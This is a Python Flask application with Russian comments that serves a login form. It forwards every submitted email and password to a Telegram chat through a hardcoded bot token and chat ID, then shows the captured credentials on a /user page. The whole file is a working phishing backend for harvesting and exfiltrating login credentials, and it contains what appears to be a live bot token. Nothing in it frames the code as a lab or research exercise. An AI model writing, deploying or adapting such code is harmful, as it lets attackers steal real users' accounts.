from flask import Flask, render_template, request, redirect, url_for
import telebot

app = Flask(__name__)
TOKEN = '7141726521:AAHtp64xY9GXMlxEhO55tsq1BqTbEGDUKVI'
bot = telebot.TeleBot(TOKEN)

# Переменные для хранения последних введенных данных
last_email = None
last_password = None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    global last_email, last_password
    
    email = request.form['email']
    password = request.form['password']
    
    # Сохранение последних введенных данных
    last_email = email
    last_password = password
    
    # Отправка данных в телеграм
    bot.send_message(chat_id='6756564140', text=f'Введены данные: Email: {email}, Password: {password}')
    
    # Перенаправление на страницу /user
    return redirect(url_for('show_users'))

@app.route('/user')
def show_users():
    # Проверка наличия данных пользователя
    if last_email is not None and last_password is not None:
        # Отображение последних введенных данных
        return render_template('user.html', email=last_email, password=last_password)
    else:
        return "No user data available. Please login first."

if __name__ == '__main__':
    # Запуск Flask приложения
    app.run(debug=True)
